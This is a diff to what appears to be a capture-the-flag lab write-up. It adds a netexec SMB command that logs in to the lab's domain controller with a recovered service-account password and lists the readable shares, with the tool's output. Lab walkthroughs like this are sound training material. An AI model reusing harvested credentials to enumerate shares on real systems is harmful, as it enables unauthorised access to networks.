@@ -270,6 +270,20 @@ sql_svc:REGGIE1234ronnie
 ```
 
 ```python
-
+nxc smb dc.sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie' --shares 
+SMB         10.129.7.162    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.7.162    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+SMB         10.129.7.162    445    DC               [*] Enumerated shares
+SMB         10.129.7.162    445    DC               Share           Permissions     Remark
+SMB         10.129.7.162    445    DC               -----           -----------     ------
+SMB         10.129.7.162    445    DC               ADMIN$                          Remote Admin
+SMB         10.129.7.162    445    DC               C$                              Default share
+SMB         10.129.7.162    445    DC               IPC$            READ            Remote IPC
+SMB         10.129.7.162    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.7.162    445    DC               Public          READ            
+SMB         10.129.7.162    445    DC               SYSVOL          READ            Logon server share
 ```
+These credentials work
+
+H
 
